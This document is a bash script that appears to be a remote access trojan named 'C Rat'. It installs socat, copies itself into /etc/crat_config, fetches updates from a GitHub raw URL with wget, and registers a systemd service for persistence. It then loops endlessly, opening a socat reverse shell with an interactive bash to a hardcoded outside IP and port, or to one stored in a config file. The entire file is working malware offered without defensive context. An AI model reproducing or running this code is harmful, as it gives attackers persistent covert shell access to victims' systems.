#/bin/bash

if [ ! -x "$(command -v socat)" ]; then sudo apt install -y socat; fi
if [ ! -x "$(command -v screen)" ]; then sudo apt install -y screen; fi

# check if the file is already in /etc/crat_config/persistant/
makePersistant () {
  # check if the directory /etc/crat_config exists and create it if it doesn't
  if [ ! -d "/etc/crat_config" ]; then
    mkdir /etc/crat_config
  fi

  if [ ! -f /etc/crat_config/crat.sh ]; then
      cp crat.sh /etc/crat_config/crat.sh
  fi
}

updateScript () {
  # check if the directory /etc/crat_config exists and create it if it doesn't
  if [ ! -d "/etc/crat_config" ]; then
    mkdir /etc/crat_config
  fi

  if [ ! -f /etc/crat_config/crat.sh ]; then
    # download the latest version of the script from https://raw.githubusercontent.com/corespace-security/crat_daemon/master/crat.sh to /etc/crat_config/crat.sh
    wget -O /etc/crat_config/crat.sh https://raw.githubusercontent.com/corespace-security/crat_daemon/master/crat.sh && chmod +x /etc/crat_config/crat.sh
  fi
}

# check if crat_daemon.service is already in /etc/systemd/system/
registerDaemon () {
  if [ ! -f /etc/systemd/system/crat_daemon.service ]; then
      echo "[Unit]
        Description=C Rat service
        After=network.target

        [Service]
        ExecStart=/bin/bash /etc/crat_config/crat.sh
        Restart=always
        RestartSec=4

        [Install]
        WantedBy=multi-user.target" >> /etc/systemd/system/crat_daemon.service

      sudo systemctl start crat_daemon.service
      sudo systemctl enable crat_daemon.service
  # else 
  #   # if crat_daemon.service is already in /etc/systemd/system/ remove the old one and add the new one
  #   sudo systemctl stop crat_daemon.service
  #   sudo systemctl disable crat_daemon.service
  #   sudo rm /etc/systemd/system/crat_daemon.service
  #   echo "[Unit]
  #       Description=C Rat service
  #       After=network.target

  #       [Service]
  #       ExecStart=/bin/bash /etc/crat_config/crat.sh
  #       Restart=always
  #       RestartSec=4

  #       [Install]
  #       WantedBy=multi-user.target" >> /etc/systemd/system/crat_daemon.service

  #   sudo systemctl start crat_daemon.service
  #   sudo systemctl enable crat_daemon.service
  fi
}

updateScript && sleep 0.5
makePersistant && sleep 0.5
registerDaemon && sleep 0.5


while true
do
  # check if the file /etc/crat/crat.ccw exist
  if [ -f /etc/crat_config/crat.ccw ]; then
    ip=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 1)
    port=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 2)
  else
    if [ -z "$1" ]; then
      ip="172.104.240.146"
    else
      ip=$1
    fi

    if [ -z "$2" ]; then
      port="4545"
    else
      port=$2
    fi
  fi

  # check if ip and port are set if they are save them to /etc/crat_config/crat.ccw
  if [ ! -z "$ip" ] && [ ! -z "$port" ]; then
    echo "$ip:$port" > /etc/crat_config/crat.ccw
  fi

  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
done